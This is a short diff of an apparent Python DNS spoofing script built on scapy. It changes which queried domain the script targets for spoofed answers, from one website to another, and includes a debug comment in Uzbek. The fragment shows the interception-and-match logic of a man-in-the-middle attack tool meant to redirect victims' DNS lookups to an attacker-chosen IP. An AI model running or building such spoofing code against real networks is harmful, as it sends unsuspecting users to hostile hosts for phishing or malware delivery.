@@ -16,7 +16,7 @@ def process_packet(packet):
         # print(scapy_packet.show())
         qname = scapy_packet[scapy.DNSQR].qname
         # print("Menga kerakli joy>:", scapy_packet)
-        if "www.dslib.net." in qname.decode():
+        if "freeversions.ru" in qname.decode():
             print("[+]Spoofing target",scapy_packet.show())
             pars = get_parser()
             ip = pars.ip
